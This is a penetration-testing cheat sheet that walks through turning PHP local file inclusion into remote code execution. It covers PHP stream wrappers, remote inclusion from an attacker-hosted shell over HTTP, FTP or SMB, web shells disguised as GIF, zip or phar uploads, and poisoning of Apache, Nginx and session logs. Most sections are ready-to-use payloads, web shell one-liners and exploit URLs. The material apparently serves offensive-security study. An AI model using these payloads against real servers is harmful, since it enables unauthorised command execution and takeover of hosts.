# PHP Wrappers for RCE

PHP wrappers can be abused to achieve Remote Code Execution (RCE) via LFI when the vulnerable function supports file execution, and settings like `allow_url_include` are enabled.
### Checking `allow_url_include`
###### Use LFI + base64 filter to read the PHP config:

```
php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini
```
###### Decode and grep:

```bash
echo '<base64>' | base64 -d | grep allow_url_include
```

Must be `On` for the following wrappers to work.

```bash
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
```
### 1. `data://` Wrapper

Encodes PHP code in base64 and passes it via URL.

```bash
echo '<?php system($_GET["cmd"]); ?>' | base64
```

Then:

```
http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,<encoded>&cmd=id
```

Output:

```
uid=33(www-data)
```
### 2. `php://input` Wrapper

Send PHP shell via POST. Command is still passed via GET.

```bash
curl -X POST --data '<?php system($_GET["cmd"]); ?>' \
"http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"
```

Note:

- If only POST is accepted: hardcode command inside payload.
- Wrapper depends on `allow_url_include = On`
### 3. `expect://` Wrapper

If the `expect` PHP extension is installed:

```bash
echo '<base64>' | base64 -d | grep expect
# should return: extension=expect
```

```bash
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
extension=expect
```
Usage:

```
http://<SERVER_IP>:<PORT>/index.php?language=expect://id
```

This directly runs shell commands, no need to send a shell payload.

> ✅ These wrappers enable LFI → RCE directly and are powerful if server misconfigurations are present.

# Remote File Inclusion (RFI)
###### If the vulnerable function allows including remote URLs, RFI can be used to:
- ###### Execute remote code by including a malicious script
- ###### Enumerate local/internal services (SSRF-style)
### LFI vs RFI
###### Most RFI-vulnerable functions are also LFI-vulnerable, but not vice versa. RFI requires:
- ###### Full control over the input path (including protocol like `http://`)
- ###### Functions that support remote URLs (like `include()`)
- ###### PHP config: `allow_url_include = On`

> You can verify this with LFI:

```bash
php://filter/read=convert.base64-encode/resource=/etc/php/7.4/apache2/php.ini
```
### Verifying RFI

Try including:

```
?language=http://127.0.0.1/index.php
```

If remote content gets included and executed, then RFI is confirmed.

> ⚠️ Avoid recursive includes (like including the vulnerable page itself).
## Remote Code Execution with RFI
###  1. HTTP Server
###### Step 1: Create a simple PHP web shell:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```
###### Step 2: Host it:

```bash
sudo python3 -m http.server 80
```
###### Step 3: Include it:

```
http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>/shell.php&cmd=id
```
###  2. FTP Server
###### If HTTP is blocked, use FTP:

```bash
sudo python -m pyftpdlib -p 21
```
###### Include via:

```
?language=ftp://<OUR_IP>/shell.php&cmd=id
```
###### Auth format if needed:

```
ftp://user:pass@<OUR_IP>/shell.php
```
###  3. SMB (Windows Targets)
###### SMB works even if `allow_url_include` is off, as Windows treats remote UNC paths as local files.
###### Start SMB server:

```bash
impacket-smbserver -smb2support share $(pwd)
```
###### Include via UNC path:

```
?language=\\<OUR_IP>\share\shell.php&cmd=whoami
```

> ⚠️ SMB-based inclusion works best in local networks due to Windows firewall defaults.
### ✅ Summary

RFI allows remote script execution when `allow_url_include` is enabled or via SMB on Windows.  
Supports multiple protocols:

- `http://`
- `ftp://`
- `\\IP\share` (UNC/SMB)
# LFI and File Uploads

File uploads can indirectly help escalate LFI to Remote Code Execution (RCE). Even if the upload functionality is secure, if the file gets stored on the backend and can later be **included** via a vulnerable `include()` or `require()` call, code inside the file can get executed.
### Key Functions Supporting RCE

| Function                       | Read | Execute | Remote URL |
| ------------------------------ | ---- | ------- | ---------- |
| `include()` / `include_once()` | ✅    | ✅       | ✅          |
| `require()` / `require_once()` | ✅    | ✅       | ❌          |

> Even image files like `.jpg` or `.gif` can execute code if they’re included, not rendered.
## Malicious Image Payload

Craft a fake image with embedded PHP shell:

```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```
###### - `GIF8` = image magic bytes (ASCII) to bypass basic content-type checks.
###### - Shell still functions if included via LFI.
### Upload & Locate the File
###### Upload the fake image via profile upload:

```
http://<SERVER_IP>:<PORT>/settings.php
```
###### Inspect HTML source to find path:

```html
<img src="/profile_images/shell.gif" class="profile-image">
```
###### Then exploit with:

```
http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
```

> Adjust path using `../` if the vulnerable function prepends directories.

## Zip Upload (Using `zip://` Wrapper)
###### 1.  Create and zip a PHP shell:
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip shell.jpg shell.php
```
###### 2. Upload the ZIP archive.
###### 3. Exploit with `zip://` and file reference:

```
http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

> `%23` = `#`, used to reference file inside ZIP.
## Phar Upload (Using `phar://` Wrapper)
###### 1. Generate a `phar` archive:

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
```
###### 2. Compile and rename:

```bash
php --define phar.readonly=0 shell.php
mv shell.phar shell.jpg
```
###### 3. Upload, then trigger via:

```
http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

> `%2F` = `/` in URL encoding.

### ✅ Summary

|Technique|Wrapper Used|Notes|
|---|---|---|
|Image upload|None|Most reliable, if code is included|
|ZIP archive|`zip://`|Needs `zip` wrapper enabled|
|PHAR archive|`phar://`|Needs `phar.readonly=0` during creation|
# Log Poisoning

LFI can lead to **Remote Code Execution** by including files that contain attacker-controlled PHP code. Log poisoning works by writing PHP code into server-controlled logs (or session files), then including those via LFI to execute it.
###  Functions That Allow Code Execution

| Function                       | Read | Execute | Remote URL |
| ------------------------------ | ---- | ------- | ---------- |
| `include()` / `include_once()` | ✅    | ✅       | ✅          |
| `require()` / `require_once()` | ✅    | ✅       | ❌          |

> If the log file is readable and the vulnerable function executes code, **RCE is possible.**
## PHP Session Poisoning
###### 1. Check your PHPSESSID cookie:

```
Cookie: PHPSESSID=nhhv8i0o6ua4g88bkdl9u1fdsd
```
###### Then include it:

```
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_<PHPSESSID>
```
###### 2. Test for control over session values:

```
http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
```
###### 3. Poison with web shell (URL encoded):

```
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```
###### 4. Execute it:

```
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_<PHPSESSID>&cmd=id
```

> ⚠️ Needs re-poisoning after every execution (session gets overwritten).
## Apache / Nginx Log Poisoning

If readable, server logs can also be poisoned and executed:

- **Apache (Linux):** `/var/log/apache2/access.log`
- **Apache (Windows):** `C:\xampp\apache\logs\access.log`
- **Nginx (Linux):** `/var/log/nginx/access.log`
- **Nginx (Windows):** `C:\nginx\log\access.log`

Try reading it:

```
http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log
```
### Poison the Logs
###### Modify User-Agent header:

```http
User-Agent: <?php system($_GET['cmd']); ?>
```

Burp Suite:

- Intercept a request.
- Edit the `User-Agent` header with PHP code.    

Or use curl:

```bash
echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
```

Then include the log:

```
http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log&cmd=id
```
### Alternatives: /proc Log Poisoning

Include process environment or file descriptors:

- `/proc/self/environ`
- `/proc/self/fd/<0-50>`

If readable, you may find poisoned headers here as well. This is useful when `/var/log/...` files aren’t accessible.
### Other Log Files That Can Be Exploited
###### If LFI grants read access, poison:

- `/var/log/sshd.log`
- `/var/log/mail`    
- `/var/log/vsftpd.log`

Technique:

- Inject PHP code in usernames (SSH/FTP)
- Send malicious mail body    
- Include logs via LFI

> ✅ Works if logs store attacker-controlled input and are readable via LFI.

# Tags
> #Web-Exploitation #LFI #RCE #Filters #Wrappers  